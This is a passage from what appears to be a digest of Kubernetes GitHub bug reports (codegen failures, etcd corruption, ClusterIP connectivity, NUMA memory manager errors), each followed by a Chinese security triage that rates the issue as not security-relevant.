-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/HyphenGroup/apis/example/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/MixedCase/apis/example/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/MixedCase/apis/example/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/core":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/core
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/core/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/core/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/example":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/example
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/example/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/example/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/example2":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/example2
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/example2/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/example2/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/example3.io":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/example3.io
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/example3.io/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/example3.io/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/crd/apis/example/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/crd/apis/example/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/crd/apis/example2/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/crd/apis/example2/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/single/api/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/single/api/v1
!!! [1113 10:35:25] Call tree:
!!! [1113 10:35:25]  1: /root/***/code/kubernetes/hack/update-codegen.sh:885 codegen::deepcopy(...)
Running update-codegen FAILED 
```

#### What did you expect to happen?

make update succeed

#### How can we reproduce it (as minimally and precisely as possible)?

On the 1.31.1 branch code, run make update

#### Anything else we need to know?

my go env:
```
GO111MODULE='on'
GOARCH='amd64'
GOBIN=''
GOCACHE='/root/.cache/go-build'
GOENV='/root/.config/go/env'
GOEXE=''
GOEXPERIMENT=''
GOFLAGS=''
GOHOSTARCH='amd64'
GOHOSTOS='linux'
GOINSECURE=''
GOMODCACHE='/root/go/pkg/mod'
GONOPROXY='***.com'
GONOSUMDB='*'
GOOS='linux'
GOPATH='/root/go'
GOPRIVATE='***.com'
GOPROXY='http://***.com/goproxy/'
GOROOT='/opt/lsx/go'
GOSUMDB='sum.golang.org'
GOTMPDIR=''
GOTOOLCHAIN='auto'
GOTOOLDIR='/***/tool/linux_amd64'
GOVCS=''
GOVERSION='go1.22.1'
GCCGO='gccgo'
GOAMD64='v1'
AR='ar'
CC='gcc'
CXX='g++'
CGO_ENABLED='1'
GOMOD='/root/***/code/kubernetes/go.mod'
GOWORK='/root/***/code/kubernetes/go.work'
CGO_CFLAGS='-O2 -g'
CGO_CPPFLAGS=''
CGO_CXXFLAGS='-O2 -g'
CGO_FFLAGS='-O2 -g'
CGO_LDFLAGS='-O2 -g'
PKG_CONFIG='pkg-config'
```

#### Kubernetes version

<details>

```console
1.31.1
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
此Issue描述了在编译Kubernetes 1.31.1分支代码时，运行`make update`命令，在执行`update-codegen`步骤时发生了错误。错误信息显示代码生成器在处理一些包时失败，提示主模块`k8s.io/code-generator`不包含某些示例包。

根据风险判断标准：

1. **该风险能被攻击者利用**：此问题是开发者在本地环境中运行代码生成器时遇到的编译错误，未涉及任何可被攻击者利用的安全漏洞。

2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：此问题不涉及任何已知的安全漏洞，也未涉及可能获得高危评分的安全风险。

3. **Issue提交者在提交内容中暴露的敏感信息、不当操作、不当配置等问题，不属于安全风险**：从提供的信息来看，未暴露任何敏感信息，问题源于开发环境配置或依赖问题。

因此，该Issue不涉及安全风险，属于一般的开发环境配置或依赖问题。

---

## Issue #128730 Kubelet reporting proto: duplicate proto type registered: v1beta1.Device for dra jobs

- Issue 链接：[#128730](https://github.com/kubernetes/kubernetes/issues/128730)

### Issue 内容

#### What happened?

When Kubelet starts in the DRA test jobs, I am seeing the following log:

```
2024/11/10 12:51:40 proto: duplicate proto type registered: v1beta1.Device
```

#### What did you expect to happen?

No warning

#### How can we reproduce it (as minimally and precisely as possible)?

https://storage.googleapis.com/kubernetes-ci-logs/logs/ci-node-e2e-cgrpv2-crio-dra/1855587443407851520/artifacts/n1-standard-4-fedora-coreos-40-20241019-3-0-gcp-x86-64-5b2b14fa/kubelet.log



#### Anything else we need to know?

I don't know if this impacts anything but I noticed while debugging other issues.

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
main
</details>


#### Cloud provider

<details>
NA
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue报告在启动Kubelet时出现了警告日志：`proto: duplicate proto type registered: v1beta1.Device`。这表明在注册Protobuf类型时，存在重复注册同一类型的情况。

从安全角度分析：

- **可被攻击者利用**：此警告通常是由于代码中重复引用或注册了相同的Protobuf类型导致的，属于软件实现问题。没有证据表明攻击者可以通过此警告来执行恶意操作或利用该漏洞。

- **可能成为漏洞并被分配CVE编号，CVSS评分在High以上**：根据现有信息，此问题不会导致安全漏洞，例如代码执行、权限提升等高风险问题，因而不太可能被分配CVE编号或达到High以上的CVSS评分。

- **是否涉及拒绝服务（DoS）攻击**：该警告没有表明会导致服务崩溃或不可用，未涉及DoS风险。

- **是否影响多用户场景**：此问题未涉及用户权限或多用户隔离，攻击者无法利用该问题影响其他用户。

- **Issue内容是否充分**：根据提供的信息，无法推断存在安全风险，且提交者也未指出有功能异常或安全影响。

因此，按照风险判断标准，该Issue不涉及安全风险。

---

## Issue #128735 etcdserver: data corruption detected, unable to start etcd member

- Issue 链接：[#128735](https://github.com/kubernetes/kubernetes/issues/128735)

### Issue 内容

#### What happened?

After a sudden power outage in our on-premises data center, our Kubernetes cluster failed to recover upon reboot. The etcd server could not start and logged the following error:
`etcdserver: data corruption detected, unable to start etcd member`
So the Kubernetes API server was unavailable, and the entire cluster became non-operational.

#### What did you expect to happen?

I expected etcd to handle the abrupt shutdown gracefully and recover its data upon restart which allows the k8s control plane to become available again.

#### How can we reproduce it (as minimally and precisely as possible)?

While this issue is rare and difficult to reproduce, the following steps simulate a similar scenario:
Set up a single-node Kubernetes cluster using kubeadm, deploy some resources to populate etcd, simulate an abrupt power loss, attempt to restart etcd, check the etcd logs for the data corruption error

#### Anything else we need to know?

_No response_

#### Kubernetes version

$ kubectl version --short
Client Version: v1.26.3
Server Version: v1.26.3

#### Cloud provider

On-premises (bare-metal servers)

#### OS version

$ cat /etc/os-release
NAME="Ubuntu"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
ID=ubuntu
ID_LIKE=debian
VERSION_ID="22.04"

#### Install tools

kubeadm version: v1.26.3 
etcd version: v3.5.6

#### Container runtime (CRI) and version (if applicable)

Container Runtime: containerd 
containerd version: v1.6.15

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

CNI Plugin: Calico v3.25.0 
CSI Plugin: N/A

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在数据中心突然断电后，etcd服务器无法启动，并报告数据损坏错误，导致Kubernetes集群不可用。这是由于硬件故障（断电）导致的系统不可用问题。此问题与软件自身的安全性无关，且没有证据表明攻击者可以利用该问题造成系统不可用。根据风险判断标准，第1条，该风险无法被攻击者利用，因此不涉及安全风险。

---

## Issue #128723 Cannot connect to ClusterIP service IP but service/kubernetes works fine

- Issue 链接：[#128723](https://github.com/kubernetes/kubernetes/issues/128723)

### Issue 内容

#### What happened?

deployment:
```
Name:                   counter
Namespace:              default
CreationTimestamp:      Sat, 09 Nov 2024 19:05:14 +0800
Labels:                 app=counter
Annotations:            deployment.kubernetes.io/revision: 2
Selector:               app=counter
Replicas:               1 desired | 1 updated | 1 total | 1 available | 0 unavailable
StrategyType:           RollingUpdate
MinReadySeconds:        0
RollingUpdateStrategy:  25% max unavailable, 25% max surge
Pod Template:
  Labels:  app=counter
  Containers:
   counter:
    Image:      192.168.64.1/counter:0.9.0-2
    Port:       8080/TCP
    Host Port:  0/TCP
    Limits:
      cpu:     500m
      memory:  512Mi
    Requests:
      cpu:         250m
      memory:      256Mi
    Liveness:      http-get http://:8080/health delay=0s timeout=1s period=5s #success=1 #failure=3
    Readiness:     http-get http://:8080/health delay=0s timeout=1s period=5s #success=1 #failure=3
    Startup:       http-get http://:8080/health delay=5s timeout=1s period=10s #success=1 #failure=3
    Environment:   <none>
    Mounts:        <none>
  Volumes:         <none>
  Node-Selectors:  <none>
  Tolerations:     <none>
Conditions:
  Type           Status  Reason
  ----           ------  ------
  Available      True    MinimumReplicasAvailable
  Progressing    True    NewReplicaSetAvailable
OldReplicaSets:  counter-584dc6d44f (0/0 replicas created)
NewReplicaSet:   counter-67dc886c6 (1/1 replicas created)
Events:
  Type    Reason             Age   From                   Message
  ----    ------             ----  ----                   -------
  Normal  ScalingReplicaSet  46m   deployment-controller  Scaled up replica set counter-67dc886c6 to 1
  Normal  ScalingReplicaSet  45m   deployment-controller  Scaled down replica set counter-584dc6d44f to 0 from 1
```
service:
```     
Name:                     counter
Namespace:                default
Labels:                   <none>
Annotations:              <none>
Selector:                 app=counter
Type:                     ClusterIP
IP Family Policy:         SingleStack
IP Families:              IPv4
IP:                       10.96.92.104
IPs:                      10.96.92.104
Port:                     <unset>  8080/TCP
TargetPort:               8080/TCP
Endpoints:                10.96.0.153:8080
Session Affinity:         None
Internal Traffic Policy:  Cluster
Events:                   <none>
```

I can curl using pod ip:
```
/ # curl -v '10.96.0.153:8080/health'
*   Trying 10.96.0.153:8080...
* Connected to 10.96.0.153 (10.96.0.153) port 8080
* using HTTP/1.x
> GET /health HTTP/1.1
> Host: 10.96.0.153:8080
> User-Agent: curl/8.11.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sat, 09 Nov 2024 15:07:38 GMT
< Content-Length: 2
< Content-Type: text/plain; charset=utf-8
< 
* Connection #0 to host 10.96.0.153 left intact
```

I can curl the kubernetes cluster service ip:
```
/ # curl --cacert /run/secrets/kubernetes.io/serviceaccount/ca.crt 'https://10.96.0.1'
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {},
  "code": 403
}/
```

But not the counter clusterIP service ip:
```
# curl -v '10.96.92.104:8080/health'
*   Trying 10.96.92.104:8080...
* connect to 10.96.92.104 port 8080 from 10.96.0.155 port 57732 failed: Host is unreachable
* Failed to connect to 10.96.92.104 port 8080 after 3074 ms: Could not connect to server
* closing connection #0
curl: (7) Failed to connect to 10.96.92.104 port 8080 after 3074 ms: Could not connect to server
```

#### What did you expect to happen?

curl should be able to connect to the pod through service cluster ip.

#### How can we reproduce it (as minimally and precisely as possible)?

See what happened.

#### Anything else we need to know?

core dns is not installed, but it shouldn't affect the IP communication?

iptables-save:
```
# Generated by iptables-save v1.8.10 (nf_tables) on Sat Nov  9 23:31:08 2024
*mangle
:PREROUTING ACCEPT [0:0]
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
:KUBE-IPTABLES-HINT - [0:0]
:KUBE-KUBELET-CANARY - [0:0]
:KUBE-PROXY-CANARY - [0:0]
COMMIT
# Completed on Sat Nov  9 23:31:08 2024
# Generated by iptables-save v1.8.10 (nf_tables) on Sat Nov  9 23:31:08 2024
*filter
:INPUT ACCEPT [118837:27126544]
:FORWARD ACCEPT [9:564]
:OUTPUT ACCEPT [114352:26069266]
:KUBE-EXTERNAL-SERVICES - [0:0]
:KUBE-FIREWALL - [0:0]
:KUBE-FORWARD - [0:0]
:KUBE-KUBELET-CANARY - [0:0]
:KUBE-NODEPORTS - [0:0]
:KUBE-PROXY-CANARY - [0:0]
:KUBE-PROXY-FIREWALL - [0:0]
:KUBE-SERVICES - [0:0]
-A INPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes load balancer firewall" -j KUBE-PROXY-FIREWALL
-A INPUT -m comment --comment "kubernetes health check service ports" -j KUBE-NODEPORTS
-A INPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes externally-visible service portals" -j KUBE-EXTERNAL-SERVICES
-A INPUT -j KUBE-FIREWALL
-A FORWARD -m conntrack --ctstate NEW -m comment --comment "kubernetes load balancer firewall" -j KUBE-PROXY-FIREWALL
-A FORWARD -m comment --comment "kubernetes forwarding rules" -j KUBE-FORWARD
-A FORWARD -m conntrack --ctstate NEW -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A FORWARD -m conntrack --ctstate NEW -m comment --comment "kubernetes externally-visible service portals" -j KUBE-EXTERNAL-SERVICES
-A OUTPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes load balancer firewall" -j KUBE-PROXY-FIREWALL
-A OUTPUT -m conntrack --ctstate NEW -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A OUTPUT -j KUBE-FIREWALL
-A KUBE-FIREWALL ! -s 127.0.0.0/8 -d 127.0.0.0/8 -m comment --comment "block incoming localnet connections" -m conntrack ! --ctstate RELATED,ESTABLISHED,DNAT -j DROP
-A KUBE-FORWARD -m conntrack --ctstate INVALID -m nfacct --nfacct-name  ct_state_invalid_dropped_pkts -j DROP
-A KUBE-FORWARD -m comment --comment "kubernetes forwarding rules" -m mark --mark 0x4000/0x4000 -j ACCEPT
-A KUBE-FORWARD -m comment --comment "kubernetes forwarding conntrack rule" -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
COMMIT
# Completed on Sat Nov  9 23:31:08 2024
# Generated by iptables-save v1.8.10 (nf_tables) on Sat Nov  9 23:31:08 2024
*nat
:PREROUTING ACCEPT [71:6762]
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [942:57109]
:POSTROUTING ACCEPT [942:57109]
:CNI-32c0cf70887216191130ae52 - [0:0]
:CNI-fc6a5510842a2a3576c15fbb - [0:0]
:KUBE-KUBELET-CANARY - [0:0]
:KUBE-MARK-MASQ - [0:0]
:KUBE-NODEPORTS - [0:0]
:KUBE-POSTROUTING - [0:0]
:KUBE-PROXY-CANARY - [0:0]
:KUBE-SEP-B63S3RA5AW4YSP7P - [0:0]
:KUBE-SEP-DFZXXNAWG6RPGZZM - [0:0]
:KUBE-SERVICES - [0:0]
:KUBE-SVC-5ZCCYHVHEKPK335L - [0:0]
:KUBE-SVC-NPX46M4PTMTKRN6Y - [0:0]
-A PREROUTING -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A OUTPUT -m comment --comment "kubernetes service portals" -j KUBE-SERVICES
-A POSTROUTING -m comment --comment "kubernetes postrouting rules" -j KUBE-POSTROUTING
-A POSTROUTING -s 10.96.0.153/32 -m comment --comment "name: \"bridge\" id: \"52267394d50c383398b20d0bbf3d97132edf416fc0550f964d5c959df37602e0\"" -j CNI-32c0cf70887216191130ae52
-A POSTROUTING -s 10.96.0.162/32 -m comment --comment "name: \"bridge\" id: \"fd7924fa6c8ef041c791a5e7c844c46bb8609799a70be757bfe4662d30724ced\"" -j CNI-fc6a5510842a2a3576c15fbb
-A CNI-32c0cf70887216191130ae52 -d 10.96.0.0/16 -m comment --comment "name: \"bridge\" id: \"52267394d50c383398b20d0bbf3d97132edf416fc0550f964d5c959df37602e0\"" -j ACCEPT
-A CNI-32c0cf70887216191130ae52 ! -d 224.0.0.0/4 -m comment --comment "name: \"bridge\" id: \"52267394d50c383398b20d0bbf3d97132edf416fc0550f964d5c959df37602e0\"" -j MASQUERADE
-A CNI-fc6a5510842a2a3576c15fbb -d 10.96.0.0/16 -m comment --comment "name: \"bridge\" id: \"fd7924fa6c8ef041c791a5e7c844c46bb8609799a70be757bfe4662d30724ced\"" -j ACCEPT
-A CNI-fc6a5510842a2a3576c15fbb ! -d 224.0.0.0/4 -m comment --comment "name: \"bridge\" id: \"fd7924fa6c8ef041c791a5e7c844c46bb8609799a70be757bfe4662d30724ced\"" -j MASQUERADE
-A KUBE-MARK-MASQ -j MARK --set-xmark 0x4000/0x4000
-A KUBE-POSTROUTING -m mark ! --mark 0x4000/0x4000 -j RETURN
-A KUBE-POSTROUTING -j MARK --set-xmark 0x4000/0x0
-A KUBE-POSTROUTING -m comment --comment "kubernetes service traffic requiring SNAT" -j MASQUERADE --random-fully
-A KUBE-SEP-B63S3RA5AW4YSP7P -s 192.168.64.2/32 -m comment --comment "default/kubernetes:https" -j KUBE-MARK-MASQ
-A KUBE-SEP-B63S3RA5AW4YSP7P -p tcp -m comment --comment "default/kubernetes:https" -m tcp -j DNAT --to-destination 192.168.64.2:6443
-A KUBE-SEP-DFZXXNAWG6RPGZZM -s 10.96.0.153/32 -m comment --comment "default/counter" -j KUBE-MARK-MASQ
-A KUBE-SEP-DFZXXNAWG6RPGZZM -p tcp -m comment --comment "default/counter" -m tcp -j DNAT --to-destination 10.96.0.153:8080
-A KUBE-SERVICES -d 10.96.92.104/32 -p tcp -m comment --comment "default/counter cluster IP" -m tcp --dport 8080 -j KUBE-SVC-5ZCCYHVHEKPK335L
-A KUBE-SERVICES -d 10.96.0.1/32 -p tcp -m comment --comment "default/kubernetes:https cluster IP" -m tcp --dport 443 -j KUBE-SVC-NPX46M4PTMTKRN6Y
-A KUBE-SERVICES -m comment --comment "kubernetes service nodeports; NOTE: this must be the last rule in this chain" -m addrtype --dst-type LOCAL -j KUBE-NODEPORTS
-A KUBE-SVC-5ZCCYHVHEKPK335L ! -s 10.96.0.0/16 -d 10.96.92.104/32 -p tcp -m comment --comment "default/counter cluster IP" -m tcp --dport 8080 -j KUBE-MARK-MASQ
-A KUBE-SVC-5ZCCYHVHEKPK335L -m comment --comment "default/counter -> 10.96.0.153:8080" -j KUBE-SEP-DFZXXNAWG6RPGZZM
-A KUBE-SVC-NPX46M4PTMTKRN6Y ! -s 10.96.0.0/16 -d 10.96.0.1/32 -p tcp -m comment --comment "default/kubernetes:https cluster IP" -m tcp --dport 443 -j KUBE-MARK-MASQ
-A KUBE-SVC-NPX46M4PTMTKRN6Y -m comment --comment "default/kubernetes:https -> 192.168.64.2:6443" -j KUBE-SEP-B63S3RA5AW4YSP7P
COMMIT
# Completed on Sat Nov  9 23:31:08 2024
```

#### Kubernetes version

```
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.31.2
```

#### Cloud provider

N/A, standalone setup with control plane components installed as systemd services.

#### OS version

Apple virtualization VM (macOS 15.1)
```
NAME="Arch Linux ARM"
PRETTY_NAME="Arch Linux ARM"
ID=archarm
ID_LIKE=arch
BUILD_ID=rolling
ANSI_COLOR="38;2;23;147;209"
HOME_URL="https://archlinuxarm.org/"
DOCUMENTATION_URL="https://archlinuxarm.org/wiki"
SUPPORT_URL="https://archlinuxarm.org/forum"
BUG_REPORT_URL="https://github.com/archlinuxarm/PKGBUILDs/issues"
LOGO=archlinux-logo
```

#### Install tools

N/A

#### Container runtime (CRI) and version (if applicable)

containerd github.com/containerd/containerd v1.7.23 57f17b0a6295a39009d861b89e3b3b87b005ca27.m

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

```json
{
  "cniVersion": "1.0.0",
  "name": "bridge",
  "type": "bridge",
  "bridge": "k8s",
  "isDefaultGateway": true,
  "ipMasq": true,
  "ipam": {
    "type": "host-local",
    "subnet": "10.96.0.0/16"
  }
}
```

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue报告了在Kubernetes集群中无法通过Service的ClusterIP访问Pod，但可以直接使用Pod IP访问。Issue内容包括Deployment和Service的配置，Pod的访问测试，以及iptables的规则导出等。这些都是用于排查网络连接问题的正常信息。

从提供的信息来看，没有涉及任何潜在的安全风险。没有暴露敏感信息，也没有描述可能被攻击者利用的漏洞。根据风险判断标准第6条，如果Issue不涉及安全问题，则风险评级判断为不涉及。

因此，该Issue不涉及安全风险。

---

## Issue #128717 Error when run `build/run.sh make test-cmd` in containerized build environment

- Issue 链接：[#128717](https://github.com/kubernetes/kubernetes/issues/128717)

### Issue 内容

#### What happened?

According to "https://github.com/kubernetes/kubernetes/tree/master/build", I use `build/run.sh make test-cmd` to run CLI tests, in my WSL2 environment, and get error: `got error: fork/exec /go/src/k8s.io/kubernetes/_output/local/go/bin/kubeadm: no such file or directory`.

Please see detailed logs in this attachment:
[error-log.txt](https://github.com/user-attachments/files/17686344/error-log.txt)

I've made some investigation, and it looks like the issue is caused by `KUBEADM_PATH ` exported in `hack/make-rules/test-cmd.sh`
https://github.com/kubernetes/kubernetes/blob/feb3f92bc42f006874f68c476c2d7a6f2ac5ab16/hack/make-rules/test-cmd.sh#L177

If I change this line with: 
`export KUBEADM_PATH="${KUBEADM_PATH:=$(kube::realpath "${KUBE_ROOT}")/_output/dockerized/go/bin/kubeadm}"`, the error is gone.

#### What did you expect to happen?

Command `build/run.sh make test-cmd` runs without error: "no such file or directory"

#### How can we reproduce it (as minimally and precisely as possible)?

With Docker Desktop, run command `build/run.sh make test-cmd` in WSL2 backend.

#### Anything else we need to know?

_No response_

#### Kubernetes version

branch master 33c64b380a1

#### Cloud provider

N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
BuildNumber  Caption                    OSArchitecture  Version
22000        Microsoft Windows 11 Home  64-bit          10.0.22000
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，此Issue描述了在使用`build/run.sh make test-cmd`命令时遇到了错误，用户通过修改`KUBEADM_PATH`的路径解决了问题。该问题是由于构建脚本中的路径配置导致的，不涉及潜在的安全风险。根据风险判断标准，此Issue不涉及安全问题。

---

## Issue #128709 If one enables PodLogsQuerySplitStreams and aims to access logs without stream, a validation error occurs

- Issue 链接：[#128709](https://github.com/kubernetes/kubernetes/issues/128709)

### Issue 内容

#### What happened?

We saw this in our alpha jobs.

https://prow.k8s.io/view/gs/kubernetes-ci-logs/logs/ci-kubernetes-e2e-kind-alpha-features/1854662086911594496

https://prow.k8s.io/view/gs/kubernetes-ci-logs/pr-logs/pull/128680/pull-e2e-gci-gce-alpha-enabled-default/1854616736976867328


#### What did you expect to happen?

One should be able to run the following command with this feature gate on:

```
kehannon@kehannon-thinkpadp1gen4i:~/Work/KubeExamples$ k get --raw /api/v1/namespaces/default/pods/example/log
The PodLogOptions "example" is invalid: stream: Required value: must be specified
```

#### How can we reproduce it (as minimally and precisely as possible)?

Start a cluster with PodLogsQuerySplitStreams enabled.

#### Anything else we need to know?

_No response_

#### Kubernetes version

1.32

#### Cloud provider

NA

#### OS version

_No response_

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在开启PodLogsQuerySplitStreams特性后，访问pod日志时如果不指定`stream`参数，会出现验证错误。这是由于在特性开启后，API需要额外的参数校验，没有提供必需的参数导致请求被拒绝。这属于功能实现和参数验证问题，不涉及任何安全风险。

根据风险判断标准第6条，如果Issue不涉及安全问题，则风险评级判断为“不涉及”。因此，本Issue的风险评级为“不涉及”。

---

## Issue #128708 NUMA-aware memory manager and Topology Manager policy of "restricted" results in UnexpectedAdmissionError

- Issue 链接：[#128708](https://github.com/kubernetes/kubernetes/issues/128708)

### Issue 内容

#### What happened?

While trying to reproduce https://github.com/kubernetes/kubernetes/issues/128669 I spun up a VM to test 1.31.2 via minikube and I think I might have uncovered a new and different bug.

I had 8GB of allocatable memory on each of two NUMA nodes. Key kubelet args were:

-cpu-manager-policy=static --kube-reserved=memory=1Gi --memory-manager-policy=Static --reserved-cpus=0,4 --reserved-memory=0:memory=1Gi;1:memory=1Gi --system-reserved=memory=1Gi --topology-manager-policy=restricted

I was able to create the first pod with 1cpu and 256Mi of memory, but when I tried to create the second pod with 1cpu and 9Gi of memory (to force it to allocate memory from both NUMA nodes) it errored out unexpectedly:

cfriesen@debian:~$ minikube kubectl -- get pod kube-mgrr-2 -o yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"kube-mgrr-2","namespace":"default"},"spec":{"containers":[{"image":"gcr.io/kubernetes-e2e-test-images/resource-consumer:1.4","imagePullPolicy":"IfNotPresent","name":"kube-mgrr-2","resources":{"limits":{"cpu":1,"memory":"9Gi"}}}]}}
  creationTimestamp: "2024-11-08T19:34:55Z"
  name: kube-mgrr-2
  namespace: default
  resourceVersion: "1028"
  uid: 2e769357-b700-49fa-96dc-2416a0379cb9
spec:
  containers:
  - image: gcr.io/kubernetes-e2e-test-images/resource-consumer:1.4
    imagePullPolicy: IfNotPresent
    name: kube-mgrr-2
    resources:
      limits:
        cpu: "1"
        memory: 9Gi
      requests:
        cpu: "1"
        memory: 9Gi
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-27rcb
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  nodeName: minikube
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - name: kube-api-access-27rcb
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  message: 'Pod was rejected: Allocate failed due to [memorymanager] failed to find
    NUMA nodes to extend the current topology hint, which is unexpected'
  phase: Failed
  reason: UnexpectedAdmissionError
  startTime: "2024-11-08T19:34:55Z"


Kubelet logs were:

Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.632981 2326 scope_container.go:75] "TopologyHints" hints={} pod="default/kube-mgrr-2" containerName="kube-mgrr-2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633153 2326 policy_static.go:541] "TopologyHints generated" pod="default/kube-mgrr-2" containerName="kube-mgrr-2" cpuHints=[{"NUMANodeAffinity":1,"Preferred":true},{"NUMANodeAffinity":2,"Preferred":true},{"NUMANodeAffinity":3,"Preferred":false}]
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633187 2326 scope_container.go:75] "TopologyHints" hints={"cpu":[{"NUMANodeAffinity":1,"Preferred":true},{"NUMANodeAffinity":2,"Preferred":true},{"NUMANodeAffinity":3,"Preferred":false}]} pod="default/kube-mgrr-2" containerName="kube-mgrr-2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633254 2326 scope_container.go:75] "TopologyHints" hints={} pod="default/kube-mgrr-2" containerName="kube-mgrr-2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633276 2326 policy.go:71] "Hint Provider has no preference for NUMA affinity with any resource"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633289 2326 policy.go:71] "Hint Provider has no preference for NUMA affinity with any resource"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633304 2326 scope_container.go:83] "ContainerTopologyHint" bestHint={"NUMANodeAffinity":1,"Preferred":true}
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633330 2326 scope_container.go:50] "Best TopologyHint" bestHint={"NUMANodeAffinity":1,"Preferred":true} pod="default/kube-mgrr-2" containerName="kube-mgrr-2"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.633342 2326 scope_container.go:56] "Topology Affinity" bestHint={"NUMANodeAffinity":1,"Preferred":true} pod="default/kube-mgrr-2" containerName="kube-mgrr-2"
